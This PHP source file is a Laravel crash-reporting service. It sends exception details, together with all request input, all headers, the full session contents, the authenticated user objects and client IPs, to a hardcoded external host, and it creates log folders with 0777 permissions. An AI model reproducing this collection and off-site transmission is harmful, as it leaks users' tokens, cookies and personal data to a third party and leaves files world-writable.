<?php


namespace App\Services\Crash;
use \Exception;

class CrashController implements CrashInterface
{

    const _URL = 'https://albadrsupport.com/albadr-task-api/api/v7/log-crash';
    const _LOG_FOLDER = __DIR__ . DIRECTORY_SEPARATOR  . 'crash-logs';
    const _SERVER_FOLDER = __DIR__ . DIRECTORY_SEPARATOR . 'crash-logs' . DIRECTORY_SEPARATOR . 'server';

    public static function handler(Exception $data) :void
    {
      
        $return = self::logger($data);

        if (isset($return) && is_array($return) && isset($return['status'])){

            self::sendErrors($return);
        }
    }

    public static function logger($data) :array{
        try{
            return [
                'status' => true,
                'msg' => self::assignMessage($data),
                'happened_at' => date('Y-m-d H:i:s'),
                'timezone' => date_default_timezone_get(),
                'c_request_url' => request()->fullUrl(),
                'project_id' => env('PROJECT', '0'),
                'c_query' => request()->all(),
                'c_headers' => request()->header(),
                'c_sessions' => self::collectSessions()
            ];
        }catch(Exception $e){
            return [
                'status' => true,
                'msg' => self::assignMessage($e),
                'happened_at' => date('Y-m-d H:i:s'),
                'timezone' => date_default_timezone_get(),
                'c_request_url' => request()->fullUrl(),
                'project_id' => env('PROJECT', '0'),
                'c_query' => request()->all(),
                'c_headers' => request()->header(),
                'c_sessions' => self::collectSessions()
            ];
        }
    }

    public static function assignMessage($exception): string
    {
        return
            'File: ' .       $exception->getFile()
            . ' in line: ' .   $exception->getLine()
            . ' has Error: ' . $exception->getCode()
            . ' - ' .          $exception->getMessage();
    }

    public static function sendErrors(array $data, $file=null) :void
    {
        try{
            self::call(json_encode($data, JSON_UNESCAPED_UNICODE), $file);
            if ($file){
                unlink($file);
            }
        }catch(\Exception $e){
            self::log(self::assignMessage($e));
        }
    }

    public static function log($messages, $type='log')
    {

        if (!file_exists(self::_LOG_FOLDER)) {
            mkdir(self::_LOG_FOLDER, 0777, true);
        }

        if (!file_exists(self::_LOG_FOLDER . DIRECTORY_SEPARATOR  . date('Y'))) {
            mkdir(self::_LOG_FOLDER . DIRECTORY_SEPARATOR  . date('Y'), 0777, true);
        }

        $path = self::_LOG_FOLDER . DIRECTORY_SEPARATOR  . date('Y') . DIRECTORY_SEPARATOR  . date('Y-m');
        $file = $path . DIRECTORY_SEPARATOR  . date('Y-m-d') . '.log';

        if ($type == 'json'){
            $path = self::_SERVER_FOLDER;
            $file =  $path . DIRECTORY_SEPARATOR . date('Y-m-d-h-i-s') . '.json';
            $messages = json_encode(json_decode($messages), JSON_PRETTY_PRINT);
        }else {
            $messages = "========================================================\n\n" . $messages . "\n\n";

        }
        if (!file_exists($path)) {
            mkdir($path, 0777, true);
        }
        if (!file_exists($file)) {
            touch($file, strtotime('-1 days'));
        }

        if (filesize($file) > 907200) {
            $fp = fopen($file, "r+");
            ftruncate($fp, 0);
            fclose($fp);
        }

        $myfile = fopen($file, "a+");
        fwrite($myfile, $messages);
        fclose($myfile);
    }

    public static function call($data, $file=null) :void{
        try{
            $curl = curl_init();
            curl_setopt_array($curl, array(
                CURLOPT_URL => self::_URL,
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_ENCODING => '',
                CURLOPT_MAXREDIRS => 10,
                CURLOPT_TIMEOUT => 0,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
                CURLOPT_CUSTOMREQUEST => 'POST',
                CURLOPT_POSTFIELDS => $data,
                CURLOPT_HTTPHEADER => array(
                    'Content-Type: application/json'
                ),
            ));

            $response = curl_exec($curl);

            curl_close($curl);
            $res = json_decode($response);

           if ($response != false && $res && isset($res->status)){
               /********* be cool ***********/
               if ($res->status == false){
                   self::log('server error for: ' . $response);
               }else {
                   if ($file != null && file_exists($file)){
                       unlink($file);
                   }
               }
           }else {
               if ($file != null && file_exists($file)){
//                   unlink($file);
               }else {
                   self::log($data, 'json');
               }

           }
        }catch (\Exception $e){
            self::log(self::assignMessage($e));
        }
    }

    public static function resendErrors() :void
    {
        $files = self::_SERVER_FOLDER;

        if ($handle = opendir($files)) {

            while (false !== ($entry = readdir($handle))) {

                if ($entry != "." && $entry != "..") {

                    try{
                        $path = self::_SERVER_FOLDER . DIRECTORY_SEPARATOR . $entry;

                        $data = file_get_contents($path);
                        $data = json_decode($data, true);

                        self::sendErrors($data, $path);
                    }catch (\Exception $e){
                        self::log(self::assignMessage($e));
                    }
                }
            }

            closedir($handle);
        }

    }


    public static function collectSessions() :array
    {
        $data = [];
        $data['sessions'] = session()->all();
        $data['auth'] = self::collectAuthenticated();
        $data['ip_address'] = request()->ip();
//        dd($data);
        return $data;
    }

    public static function collectAuthenticated()
    {
        $users = [];

        $guards = config('auth.guards');

        foreach ($guards as $guard => $data){

            if (auth()->guard($guard)->user()){
                $users[$guard] = auth()->guard($guard)->user();
            }
        }
        return $users;
    }
}
